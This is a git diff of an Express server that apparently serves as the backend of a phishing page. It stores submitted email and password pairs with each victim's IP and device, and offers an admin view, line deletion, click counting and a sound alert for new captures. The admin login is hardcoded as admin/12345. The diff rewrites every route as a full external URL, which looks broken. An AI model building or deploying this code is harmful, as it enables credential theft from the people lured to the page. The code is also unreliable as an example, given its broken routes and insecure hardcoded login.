@@ -27,7 +27,7 @@ app.use(bodyParser.json());
 const dataFilePath = path.join(__dirname, "data.txt");
 
 // 🟨 Store Email + Password in data.txt
-app.post("/api/store", (req, res) => {
+app.post("https://node-server-js-k66j.onrender.com/api/store", (req, res) => {
   const { email, password } = req.body;
   const agent = useragent.parse(req.headers["user-agent"]);
   const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
@@ -56,7 +56,7 @@ let lastDataLength = 0;
 let alertActive = false;
 
 // 🔐 Admin login check
-app.post("/api/admin/login", (req, res) => {
+app.post("https://node-server-js-k66j.onrender.com/api/admin/login", (req, res) => {
   const { username, password } = req.body;
   if (username === "admin" && password === "12345") {
     res.json({ success: true }); // Always send JSON
@@ -66,7 +66,7 @@ app.post("/api/admin/login", (req, res) => {
 });
 
 // 🟨 Return data.txt contents
-app.get("/api/data", (req, res) => {
+app.get("https://node-server-js-k66j.onrender.com/api/data", (req, res) => {
   fs.readFile(dataFilePath, "utf8", (err, data) => {
     if (err) return res.status(500).send("Error reading file");
     const lines = data.trim().split("\n").map((line, i) => ({
@@ -78,7 +78,7 @@ app.get("/api/data", (req, res) => {
 });
 
 // 🟥 Delete a line from data.txt
-app.delete("/api/data/:id", (req, res) => {
+app.delete("https://node-server-js-k66j.onrender.com/api/data/:id", (req, res) => {
   const id = parseInt(req.params.id);
   fs.readFile(dataFilePath, "utf8", (err, data) => {
     if (err) return res.status(500).send("Error reading file");
@@ -93,7 +93,7 @@ app.delete("/api/data/:id", (req, res) => {
 });
 
 // 🟢 Count total clicks
-app.post("/api/click", (req, res) => {
+app.post("https://node-server-js-k66j.onrender.com/api/click", (req, res) => {
   totalClicks++;
   const agent = useragent.parse(req.headers["user-agent"]);
   const device = agent.device.toString().toLowerCase().includes("mobile")
@@ -107,7 +107,7 @@ app.post("/api/click", (req, res) => {
 });
 
 // 🔊 Check if there's new data (for sound alert)
-app.get("/api/check-alert", (req, res) => {
+app.get("https://node-server-js-k66j.onrender.com/api/check-alert", (req, res) => {
   fs.readFile(dataFilePath, "utf8", (err, data) => {
     if (err) return res.status(500).send("Error reading file");
     const lines = data.trim().split("\n").length;
@@ -121,7 +121,7 @@ app.get("/api/check-alert", (req, res) => {
 });
 
 // 🛑 Stop the alert sound
-app.post("/api/stop-alert", (req, res) => {
+app.post("https://node-server-js-k66j.onrender.com/api/stop-alert", (req, res) => {
   alertActive = false;
   res.send("Stopped");
 });
